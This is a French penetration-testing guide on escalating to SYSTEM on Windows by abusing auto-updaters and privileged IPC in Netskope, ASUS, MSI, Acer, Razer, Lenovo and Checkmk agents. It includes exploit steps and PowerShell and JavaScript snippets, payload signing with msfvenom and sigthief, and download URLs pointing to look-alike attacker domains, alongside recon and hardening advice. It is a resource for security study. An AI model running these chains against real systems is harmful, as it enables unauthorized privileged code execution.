# Abus des mécanismes de mise à jour automatiques d’entreprise et de l’IPC privilégié (p. ex., Netskope, ASUS et MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une catégorie de chaînes d’escalade de privilèges locales sous Windows, observées dans des agents et des mécanismes de mise à jour de terminaux d’entreprise qui exposent une surface IPC facile à exploiter et un processus de mise à jour privilégié. Un exemple représentatif est Netskope Client pour Windows < R129 (CVE-2025-0309) : un utilisateur peu privilégié peut contraindre l’inscription à utiliser un serveur contrôlé par un attaquant, puis fournir un MSI malveillant que le service SYSTEM installe.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Idées clés applicables à des produits similaires :
- Abuser de l’IPC localhost d’un service privilégié pour forcer une nouvelle inscription ou une reconfiguration vers un serveur contrôlé par un attaquant.
- Implémenter les points de terminaison de mise à jour du fournisseur, fournir un Trusted Root CA malveillant et diriger le mécanisme de mise à jour vers un paquet malveillant « signé ».
- Contourner les vérifications faibles de signature (listes d’autorisation CN), les indicateurs de condensat facultatifs et les propriétés MSI permissives.
- Si l’IPC est « chiffré », dériver la clé et le vecteur d’initialisation (IV) à partir d’identifiants machine lisibles par tous et stockés dans le registre.
- Si le service limite les appelants selon le chemin de l’image ou le nom du processus, injecter du code dans un processus autorisé ou en lancer un en état suspendu, puis charger votre DLL au moyen d’une modification minimale du contexte de thread.

Les services TCP locaux personnalisés méritent le même examen de l’identité et des limites des entrées, même s’ils exigent un code PIN ou un autre identifiant d’application. Associez le port d’écoute au processus et au compte de service effectif, puis examinez le binaire/la version réellement déployés et vérifiez si les champs contrôlés par l’appelant sont soumis à un contrôle de longueur avant d’être copiés dans des tampons de taille fixe ou utilisés pour construire la commande d’un processus enfant. Les [conseils de Microsoft sur les dépassements de tampon](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) expliquent pourquoi les entrées externes non vérifiées sont dangereuses dans du code natif privilégié. Un port d’écoute loopback, un identifiant codé en dur ou un nom de processus ne suffisent pas, à eux seuls, à établir l’existence d’une corruption mémoire ou d’une exécution en tant que SYSTEM ; l’accessibilité, l’autorisation, le chemin d’exécution et les mesures d’atténuation restent des conditions distinctes. Lors de l’énumération courante, restez passif au lieu d’envoyer à un service en production des entrées de longueur susceptible de provoquer un plantage.

---
## 1) Forcer l’inscription auprès d’un serveur contrôlé par un attaquant via l’IPC localhost

De nombreux agents fournissent un processus d’interface utilisateur en mode utilisateur qui communique avec un service SYSTEM via TCP localhost au moyen de JSON.

Observé dans Netskope :
- Interface utilisateur : stAgentUI (faible intégrité) ↔ Service : stAgentSvc (SYSTEM)
- ID de commande IPC 148 : IDP_USER_PROVISIONING_WITH_TOKEN

Procédure d’exploitation :
1) Créez un jeton d’inscription JWT dont les revendications contrôlent l’hôte backend (p. ex., AddonUrl). Utilisez alg=None pour ne pas avoir à fournir de signature.
2) Envoyez le message IPC qui appelle la commande de provisionnement avec votre JWT et le nom du tenant :

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Le service commence à contacter votre serveur malveillant pour l’inscription/la configuration, par exemple :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Remarques :
- Si la vérification de l’appelant se base sur le chemin/nom, envoyez la requête depuis un binaire fournisseur autorisé (voir §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC de gestion exposé sur le réseau

Cette frontière de confiance ne se limite pas toujours à localhost. Dans le cas signalé de MyReport Updater 2.1.1, un service `LocalSystem` écoutait sur toutes les interfaces et acceptait une modification de configuration gRPC non authentifiée portant sur l’hôte de référence, le port et le mode de fonctionnement. Pour la variante à distance, l’accès réseau à l’écouteur et l’accès sortant du service à la référence choisie étaient tous deux nécessaires. Évaluez ces points séparément de la possibilité que le flux de package ultérieur franchisse la frontière d’écriture de fichiers.<sup>[[16]](#references)</sup>

---
## 2) Détourner le canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client communique avec votre serveur, implémentez les points de terminaison attendus et redirigez-le vers un MSI contrôlé par l’attaquant. Séquence typique :

1) /v2/config/org/clientconfig → Renvoyer une configuration JSON avec un intervalle de mise à jour très court, par exemple :
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA PEM. Le service l’installe dans le magasin Trusted Root de l’ordinateur local.
3) /v2/checkupdate → Fournissez des métadonnées pointant vers un MSI malveillant et une fausse version.

Contournement des vérifications courantes observées sur le terrain :
- Liste d’autorisation des CN de signataires : le service peut vérifier uniquement que le Subject CN est égal à « netSkope Inc » ou « Netskope, Inc. ». Votre CA rogue peut émettre un certificat leaf avec ce CN et signer le MSI.
- Propriété CERT_DIGEST : incluez une propriété MSI bénigne nommée CERT_DIGEST. Aucune validation n’est effectuée lors de l’installation.
- Application facultative du digest : un indicateur de configuration (par exemple, check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
et exécute du code arbitraire en tant que NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Leçon sur le contournement des correctifs : si un fournisseur réagit en ajoutant une petite liste d’autorisation de domaines « fiables » au lieu d’authentifier cryptographiquement la source de mise à jour, cherchez des redirecteurs ou des reverse proxies appartenant au fournisseur qui vous permettent toujours de rediriger le trafic. Dans le cas de Netskope, des recherches publiques ultérieures ont montré qu’une liste d’autorisation datant de l’ère R129 pouvait encore être contournée via `rproxy.goskope.com`, qui agissait comme proxy pour du contenu Azure App Service contrôlé par l’attaquant. Considérez les listes d’autorisation de noms d’hôte comme un obstacle, et non comme une frontière de confiance.<sup>[[14]](#references)</sup>

Un autre mode de défaillance est celui des **métadonnées de package cohérentes entre elles, mais non authentifiées**. Dans le cas de MyReport, une référence contrôlée par l’attaquant hébergeait une archive modifiée, tandis qu’un intermédiaire modifiait le digest MD5 et les réponses de taille du fournisseur avant qu’elles n’atteignent le programme de mise à jour. La concordance de ces valeurs vérifiait la cohérence des réponses, pas leur origine fournisseur ; aucune collision MD5 n’était nécessaire. Un répertoire d’installation choisi par l’appelant transformait ensuite l’extraction privilégiée en frontière d’écriture de fichiers. La primitive de chargement de DLL qui en résulte est abordée dans [l’enchaînement d’une écriture de fichier arbitraire avec le détournement de DLL](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Falsification de requêtes IPC chiffrées (si présentes)

À partir de R127, Netskope a encapsulé le JSON IPC dans un champ encryptData qui ressemble à du Base64. La rétro-ingénierie a révélé l’utilisation d’AES, avec une clé et un IV dérivés de valeurs du registre lisibles par n’importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard.<sup>[[1]](#references)[[2]](#references)</sup> Conseil général : si un agent se met soudainement à « chiffrer » son IPC, cherchez des identifiants d’appareil, des GUID de produit et des identifiants d’installation dans HKLM qui pourraient servir de matériau.

---
## 4) Contournement des listes d’autorisation des appelants IPC (vérification du chemin/nom)

Certains services tentent d’authentifier le pair en récupérant le PID de la connexion TCP et en comparant le chemin/nom de l’image à ceux de binaires du fournisseur autorisés, situés sous Program Files (par exemple, stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- Injection de DLL dans un processus autorisé (par exemple, nsdiag.exe), puis relais de l’IPC depuis ce processus.
- Lancement d’un binaire autorisé en état suspendu et initialisation de votre DLL proxy sans CreateRemoteThread (voir §5) afin de respecter les règles anti-sabotage imposées par le driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatible avec la protection anti-sabotage : processus suspendu + patch NtContinue

Les produits embarquent souvent un driver minifilter/OB callbacks (par exemple, Stadrv) qui retire les droits dangereux des handles vers les processus protégés :
- Processus : retire PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : limite les droits à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un chargeur user-mode fiable qui respecte ces contraintes :
1) Créez un processus avec un binaire du fournisseur et CREATE_SUSPENDED.
2) Obtenez les handles auxquels vous avez encore accès : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le processus, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou uniquement THREAD_RESUME si vous patchez le code à un RIP connu).
3) Écrasez ntdll!NtContinue (ou un autre thunk précoce dont le mappage est garanti) avec un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis reprend l’exécution.
4) Appelez ResumeThread pour déclencher votre stub dans le processus et charger votre DLL.

Comme vous n’avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l’avez créé), la politique du driver est respectée.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Outils pratiques
- NachoVPN (plugin Netskope) automatise la création d’une CA rogue, la signature d’un MSI malveillant et l’hébergement des points de terminaison requis : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope est un client IPC personnalisé qui construit des messages IPC arbitraires (éventuellement chiffrés avec AES) et inclut l’injection dans un processus suspendu afin que les messages proviennent d’un binaire autorisé.<sup>[[4]](#references)</sup>

## 7) Workflow de triage rapide des surfaces de mise à jour/IPC inconnues

Face à un nouvel agent de point de terminaison ou à une suite logicielle « helper » de carte mère, un workflow rapide suffit généralement pour déterminer si vous avez affaire à une cible prometteuse d’élévation de privilèges :<sup>[[6]](#references)</sup>

1) Énumérez les écouteurs loopback et associez-les aux processus du fournisseur :

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Énumérer les canaux nommés candidats :

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraire les données de routage stockées dans le registre et utilisées par les serveurs IPC basés sur des plugins :

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrayez d’abord les noms des points de terminaison, les clés JSON et les identifiants de commande du client en mode utilisateur. Les frontends Electron/.NET empaquetés leak fréquemment le schéma complet :

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Recherchez le prédicat de confiance réel, pas seulement le chemin de code qui finit par lancer le processus :

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patterns à traiter en priorité :
- `CryptQueryObject`/l’analyse de certificats sans `WinVerifyTrust` signifie généralement que « le certificat existe » a été considéré comme « le certificat est approuvé », ce qui permet le clonage de certificats ou d’autres astuces de faux signataire.
- Les vérifications de sous-chaîne/suffixe sur `Origin`, `Referer`, les URL de téléchargement, les noms de processus ou les CN de signataire ne constituent pas une authentification. `contains(".vendor.com")` est généralement exploitable avec des domaines ressemblants contrôlés par l’attaquant.
- Si l’interface graphique à faibles privilèges décide que « le fichier est approuvé » et que le broker SYSTEM se contente d’utiliser ce résultat, modifier ou réimplémenter la DLL/JS côté client permet souvent de contourner entièrement cette frontière (séparation de validation de type Razer).
- Si le broker copie un payload vers `%TEMP%`/`C:\Windows\Temp`, puis le valide ou le planifie depuis cet emplacement, testez immédiatement les fenêtres de remplacement TOCTOU ainsi que les modules de plugin frères qui exposent d’autres wrappers `ExecuteTask()` avec des vérifications plus faibles.<sup>[[6]](#references)</sup>

Pour les cibles utilisant beaucoup de named pipes, PipeViewer permet de repérer rapidement les DACL faibles et les pipes accessibles à distance avant d’analyser le protocole en profondeur.<sup>[[11]](#references)</sup>

Si la cible authentifie les appelants uniquement par PID, chemin de l’image ou nom du processus, considérez cela comme un ralentissement plutôt que comme une frontière : injecter du code dans le client légitime ou établir la connexion depuis un processus autorisé suffit souvent à satisfaire les vérifications du serveur. Pour les named pipes en particulier, [cette page sur l’usurpation d’identité du client et l’abus des pipes](named-pipe-client-impersonation.md) décrit plus en détail cette primitive.

Pour un **broker de nettoyage ou de restauration** privilégié, examinez la frontière de confiance des chemins ainsi que l’ACL du pipe. Un appelant disposant de privilèges moindres peut être en mesure de choisir une destination de restauration ou de renommer un artefact de sauvegarde préparé dans un répertoire partagé, même si l’exécutable du service et son répertoire d’installation sont protégés. Vérifiez séparément que l’appelant peut accéder à la commande de restauration, modifier le fichier d’entrée préparé exact ou son nom, que le broker s’exécute sous une identité plus privilégiée et que l’opération de restauration écrit effectivement dans le chemin protégé choisi. Un répertoire de préparation accessible en écriture ou un pipe lisible ne suffit pas à établir l’existence d’une écriture privilégiée arbitraire ; la correspondance de destination et le comportement du service doivent être examinés dans le code ou testés de manière contrôlée. N’exécutez pas une commande de nettoyage inconnue pendant une énumération passive, car elle pourrait supprimer des fichiers utilisateur.

---
## 8) Brokers d’add-ins modulaires authentifiés uniquement par des signatures de fournisseur (modèle Lenovo Vantage)

Une variante plus récente à rechercher est le **broker RPC à client signé** : un processus de bureau Lenovo signé, disposant de faibles privilèges, communique avec un service SYSTEM, et le service achemine des commandes JSON vers un ensemble d’add-ins décrits en XML sous `%ProgramData%`. Dès que l’exécution de code est obtenue **dans n’importe quel client signé accepté**, chaque contrat `runas="system"` fait partie de votre surface d’attaque.<sup>[[15]](#references)</sup>

Primitives à forte valeur observées dans les recherches sur Lenovo Vantage :
- **Faire confiance à l’appelant parce qu’il est signé par le fournisseur** : des chercheurs ont obtenu un contexte authentifié en copiant un EXE signé par Lenovo dans un répertoire accessible en écriture et en satisfaisant un DLL side-load (`profapi.dll`) afin d’exécuter du code arbitraire dans un client déjà approuvé par le service.
- **Découverte de la surface d’attaque pilotée par les manifestes** : les add-ins sont déclarés dans `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` ; plusieurs contrats s’exécutent en tant que `SYSTEM`, donc l’énumération de ces manifestes révèle souvent les véritables verbes privilégiés plus rapidement que l’analyse du broker lui-même.
- **Bugs par commande derrière le canal authentifié** : une fois dans le client approuvé, les recherches publiques ont révélé des conditions de traversée de chemin + de course dans les verbes update/install, un abus de SQL brut dans les bases de données de paramètres privilégiées et des vérifications de chemin de registre fondées sur des sous-chaînes, qui permettaient des écritures en dehors de la ruche prévue.

Recon utile sur une cible :

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

En pratique : chaque fois qu’une suite d’outils auxiliaires expose un broker qui authentifie d’abord le **processus appelant**, puis distribue les commandes à des dizaines de plugins/add-ins, ne vous arrêtez pas après avoir contourné le contrôle de confiance initial. Extrayez la table des manifestes/contrats et fuzz chaque commande à privilèges élevés indépendamment ; le canal authentifié dissimule généralement plusieurs bugs de seconde étape.

---
## 1) CSRF depuis un navigateur vers localhost contre des API HTTP privilégiées (ASUS DriverHub)

DriverHub fournit un service HTTP en mode utilisateur (ADU.exe) sur 127.0.0.1:53000, qui attend des appels du navigateur provenant de https://driverhub.asus.com. Le filtre d’origine exécute simplement `string_contains(".asus.com")` sur l’en-tête Origin et sur les URL de téléchargement exposées par `/asus/v1.0/*`. Tout hôte contrôlé par un attaquant, tel que `https://driverhub.asus.com.attacker.tld`, passe donc le contrôle et peut envoyer des requêtes modifiant l’état depuis JavaScript.<sup>[[6]](#references)</sup> Consultez [les bases du CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) pour découvrir d’autres méthodes de contournement.

Déroulement pratique :
1) Enregistrez un domaine qui contient `.asus.com` et hébergez-y une page web malveillante.
2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (p. ex., `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyez le corps JSON attendu par le gestionnaire — le JS frontend minifié présente le schéma ci-dessous.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Même le CLI PowerShell présenté ci-dessous réussit lorsque l’en-tête Origin est usurpé pour prendre la valeur de confiance :

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Toute visite du site de l’attaquant par un navigateur devient donc un CSRF local en 1 clic (ou en 0 clic via `onload`) qui pilote un helper SYSTEM.

---
## 2) Vérification non sécurisée de la signature de code et clonage de certificat (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de sous-chaîne ; `http://updates.asus.com.attacker.tld:8000/payload.exe` est donc accepté. Après le téléchargement, ADU.exe vérifie simplement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter : pas de `WinVerifyTrust`, pas de validation de chaîne.

Pour exploiter ce mécanisme :
1) Créez un payload (par exemple, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonez le signataire d’ASUS dans celui-ci (par exemple, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hébergez `pwn.exe` sur un domaine ressemblant à `.asus.com` et déclenchez UpdateApp via le CSRF navigateur ci-dessus.

Comme les filtres Origin et URL reposent tous deux sur des sous-chaînes et que la vérification du signataire ne compare que des chaînes, DriverHub récupère et exécute le binaire de l’attaquant avec des privilèges élevés.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU dans les chemins de copie/exécution de l’updater (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque trame est composée de `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son gestionnaire :
1) Copie l’exécutable fourni dans `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le sujet du certificat doit être égal à “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer la trame A en pointant vers un binaire légitime signé par MSI (ce qui garantit la réussite de la vérification de signature et la mise en file d’attente de la tâche).
- La mettre en concurrence avec des messages répétés de trame B pointant vers un payload malveillant, qui écrase `MSI Center SDK.exe` juste après la fin de la vérification.

Lorsque le planificateur se déclenche, il exécute le payload écrasé sous SYSTEM, bien que le fichier d’origine ait été validé. Une exploitation fiable utilise deux goroutines/threads qui envoient des requêtes CMD_AutoUpdateSDK en boucle jusqu’à remporter la fenêtre TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Exploitation d’IPC personnalisés au niveau SYSTEM et de l’impersonation (MSI Center + Acer Control Centre)

### Jeux de commandes TCP de MSI Center
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers octets d’une trame sélectionnent ce composant, ce qui permet aux attaquants d’acheminer des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres exécuteurs de tâches. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` **sans aucune validation de signature** : tout utilisateur local peut lui faire exécuter `C:\Users\<user>\Desktop\payload.exe` et obtenir de façon déterministe une exécution SYSTEM.
- L’écoute du trafic loopback avec Wireshark ou l’instrumentation des binaires .NET dans dnSpy révèle rapidement la correspondance entre les composants et les commandes ; des clients personnalisés en Go/Python peuvent ensuite rejouer les trames.<sup>[[6]](#references)</sup>

### Canaux nommés et niveaux d’impersonation d’Acer Control Centre
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, dont la liste de contrôle d’accès discrétionnaire autorise les clients distants (par exemple, `\\TARGET\pipe\treadstone_service_LightMode`). L’envoi de l’ID de commande `7` avec un chemin de fichier invoque la routine de lancement de processus du service.
- La bibliothèque cliente sérialise un octet terminateur magique (113) avec les arguments. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le gestionnaire natif associe cette valeur à un `SECURITY_IMPERSONATION_LEVEL` et à un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) mène à la branche générique qui conserve le jeton SYSTEM complet et définit un SID d’intégrité élevée (`S-1-16-12288`). Le binaire lancé s’exécute donc en tant que SYSTEM sans restriction, en local comme d’une machine à l’autre.
- Combinez cela avec le paramètre d’installation exposé (`Setup.exe -nocheck`) pour installer ACC même sur des machines virtuelles de labo et tester le canal sans matériel du fabricant.<sup>[[6]](#references)</sup>

Ces failles IPC montrent pourquoi les services localhost doivent imposer une authentification mutuelle (SID ALPC, filtres `ImpersonationLevel=Impersonation`, filtrage des jetons) et pourquoi le helper « exécuter un binaire arbitraire » de chaque module doit appliquer les mêmes vérifications de signataire.

---
## 3) Helpers COM/IPC « elevator » reposant sur une validation faible en mode utilisateur (Razer Synapse 4)

Razer Synapse 4 a ajouté un autre cas utile à cette famille : un utilisateur peu privilégié peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL en mode utilisateur (`simple_service.dll`) au lieu d’être appliquée de manière robuste dans la frontière privilégiée.

Chemin d’exploitation observé :
- Instancier l’objet COM `RzUtility.Elevator`.
- Appeler `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement avec élévation.
- Dans le PoC public, le contrôle de signature PE dans `simple_service.dll` est neutralisé par patch avant l’envoi de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.<sup>[[6]](#references)[[10]](#references)</sup>

Invocation PowerShell minimale :

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusion générale : lors de l’analyse de suites « helper », ne vous limitez pas au TCP localhost ou aux named pipes. Recherchez des classes COM portant des noms comme `Elevator`, `Launcher`, `Updater` ou `Utility`, puis vérifiez si le service privilégié valide lui-même le binaire cible ou s’il se contente de faire confiance à un résultat calculé par une DLL cliente patchable en mode utilisateur. Ce schéma dépasse le cas de Razer : toute architecture divisée où le broker à hauts privilèges consomme une décision d’autorisation ou de refus provenant du côté à faibles privilèges constitue une surface potentielle de privesc.


---
## Exécution prévisible d’un script temporaire lors de la réparation MSI (Checkmk Agent / CVE-2024-0670)

Certains agents Windows exécutent encore des actions privilégiées en écrivant un fichier `.cmd` temporaire dans `C:\Windows\Temp`, puis en l’exécutant en tant que `SYSTEM`. Si le nom de fichier est prévisible et que le service ne recrée pas les fichiers existants de manière sûre, un utilisateur à faibles privilèges peut précréer le futur fichier temporaire en lecture seule et faire exécuter au processus privilégié du contenu contrôlé par l’attaquant à la place de son propre script.

Observé dans des builds vulnérables de Checkmk Agent :
- motif des fichiers temporaires : `cmk_all_<PID>_1.cmd`
- branches concernées : `2.0.0`, `2.1.0`, `2.2.0`
- déclencheur : **réparation** MSI du package de l’agent mis en cache<sup>[[8]](#references)[[9]](#references)</sup>

Procédure pratique :
1. Estimez une plage réaliste de PID à partir des PID des processus actuels ou du PID de l’agent en cours d’exécution.
2. Écrivez une charge utile `.cmd` courte en **ASCII** (`Set-Content -Encoding Ascii` ou redirection via `cmd.exe` ; évitez la sortie PowerShell en UTF-16 pour les fichiers batch).
3. Faites un spray de `C:\Windows\Temp\cmk_all_<PID>_1.cmd` sur la plage candidate et marquez chaque fichier en lecture seule.
4. Déclenchez une réparation du MSI mis en cache afin que le service privilégié tente de recréer le script temporaire, puis l’exécute.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Si le produit vulnérable est installé avec Windows Installer, associez le MSI mis en cache au nom aléatoire dans `C:\Windows\Installer` au nom de son produit avant de déclencher la réparation :<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notes opérationnelles :
- `qwinsta` est utile lorsque `msiexec /fa` échoue depuis un shell WinRM non interactif et que vous devez déterminer si une session de bureau existante ou déconnectée peut déclencher correctement la réparation.<sup>[[7]](#references)</sup>
- Ce schéma s’applique aussi à d’autres agents de terminaux et programmes de mise à jour qui **placent des scripts temporaires dans des emplacements accessibles en écriture à tous, puis les exécutent en tant que SYSTEM**. Vérifiez la prévisibilité des noms, l’absence de sémantique de création exclusive et la possibilité de déclencher à la demande les processus de réparation et de mise à jour.

### Réparation interactive de l’installateur et console privilégiée

PDF24 Creator 11.15.1 illustre un risque distinct lié à la réparation MSI : son action personnalisée d’installation de l’imprimante peut ouvrir une console visible avec les droits SYSTEM pendant la réparation. Le fournisseur a modifié l’installateur MSI dans la version 11.15.2 pour corriger ce comportement. Une ancienne version du produit constitue seulement une piste de triage. Vérifiez le package MSI enregistré ou accessible, si cet utilisateur peut lancer une réparation, si l’action personnalisée vulnérable et le délai lié au fichier journal sont présents, et si un bureau interactif peut afficher la console. Le délai signalé reposait sur un oplock sur `faxPrnInst.log` ; le fait que le fichier soit accessible en écriture n’est pas la seule condition d’accès. Un shell non interactif, un package inaccessible ou un installateur corrigé peuvent interrompre la chaîne. Ce problème ne dépend pas de `AlwaysInstallElevated` et diffère du remplacement d’un script temporaire au nom prévisible.

---
## Détournement à distance de la chaîne d’approvisionnement via une validation faible du programme de mise à jour (WinGUp / Notepad++)

Entre juin 2025 et décembre 2025, des attaquants ayant compromis l’infrastructure d’hébergement utilisée par le processus de mise à jour de Notepad++ ont servi sélectivement des manifestes malveillants à des victimes ciblées. Les anciens programmes de mise à jour basés sur WinGUp ne vérifiaient pas complètement l’authenticité des mises à jour ; une réponse XML malveillante pouvait donc rediriger les clients vers des URL contrôlées par les attaquants. Comme le client acceptait le contenu HTTPS sans vérifier à la fois la fiabilité de la chaîne de certificats et la validité d’une signature PE sur l’installateur téléchargé, les victimes récupéraient et exécutaient un `update.exe` NSIS trojanisé.<sup>[[12]](#references)[[13]](#references)</sup>

Déroulement opérationnel (aucun exploit local nécessaire) :
1. **Interception de l’infrastructure** : compromettre le CDN/l’hébergement et répondre aux vérifications de mise à jour avec des métadonnées d’attaquant pointant vers une URL de téléchargement malveillante.
2. **NSIS trojanisé** : l’installateur récupère/exécute une charge utile et exploite deux chaînes d’exécution :
   - **Bring-your-own signed binary + sideload** : inclure le fichier signé par Bitdefender `BluetoothService.exe` et déposer une DLL malveillante `log.dll` dans son chemin de recherche. Lorsque le binaire signé s’exécute, Windows effectue le sideload de `log.dll`, qui déchiffre et charge de manière réflexive la backdoor Chrysalis (protégée par Warbird et utilisant le hachage d’API pour compliquer la détection statique).
   - **Injection de shellcode par script** : NSIS exécute un script Lua compilé qui utilise des API Win32 (par exemple, `EnumWindowStationsW`) pour injecter du shellcode et déployer Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mesures de renforcement et de détection pour tout programme de mise à jour automatique :
- Exiger la **vérification du certificat et de la signature** de l’installateur téléchargé (épingler le signataire du fournisseur, rejeter les CN/chaînes non concordants) et signer le manifeste de mise à jour lui-même (par exemple, avec XMLDSig). Bloquer les redirections contrôlées par le manifeste, sauf si elles sont validées.
